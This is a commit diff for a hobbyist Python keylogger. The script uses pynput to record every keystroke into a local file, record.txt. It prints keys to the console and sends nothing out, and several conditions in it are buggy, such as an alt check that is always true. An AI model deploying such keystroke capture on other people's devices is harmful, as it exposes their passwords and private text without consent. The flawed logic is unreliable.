d5bc500a2035912c087e88aca17ce538c87e1260
connor <connortheguy12@gmail.com>
2019-03-22 23:19:36 -0400

    Writes to file record.txt, and can insert new lines!

--- logger.py
+++ logger.py
@@ -3,33 +3,42 @@ Python Keylogger
 By Connor Jackson
 """
 from pynput import keyboard
-import datetime
 
-now = datetime.datetime.now()
 
-"""l
-Displays the keys ressed (used for debugging)
-"""
-def pressed(key):
-    print("{} was pressed".format(key.char))
+def on_press(key):
+    try:
+        # print('Alpha Key ' + key.char + ' pressed')
+        print(key)
+        file1.write(key.char)
+    except AttributeError:
+        # print('Special key ' + key.char + ' pressed')
+        print(key)
+        if key == keyboard.Key.enter:
+            file1.write('\n')
+        elif key == '.':
+            file1.write('.\n')
+        elif key == keyboard.Key.space:
+            file1.write(' ')
+        elif key == keyboard.Key.backspace:
+            file1.seek(-1)
+            file1.truncate()
+        elif key == keyboard.Key.alt or keyboard.Key.alt_gr or keyboard.Key.alt_l or keyboard.Key.alt_r:
+            file1.write(' (alt) ')
+        if key == keyboard.Key.esc:
+            file1.write(' (esc) ')
+        elif key == keyboard.Key.cmd:
+            # End key for debug purposes
+            file1.close()
+            return False
 
-"""
-Displays the keys released (also used for debugging)
-"""
-def released(key):
-    print("{} was released".format(key))
-    if key == keyboard.Key.esc:
-        #Used to end the program
-        print("Exiting")
-        return False
 
-"""
-Main function used to collect inputs
-"""
-with keyboard.Listener(on_press = pressed, on_release= released) as logger:
-    logger.join()
+def on_release(key):
+    pass
 
-def main():
-    date = now.day + "-" + now.month + "-" + now.year
-    f = open(date + ".txt", "w")
 
+global file1
+file1 = open('record.txt', 'w')
+with keyboard.Listener(
+        on_press=on_press,
+        on_release=on_release) as listener:
+    listener.join()
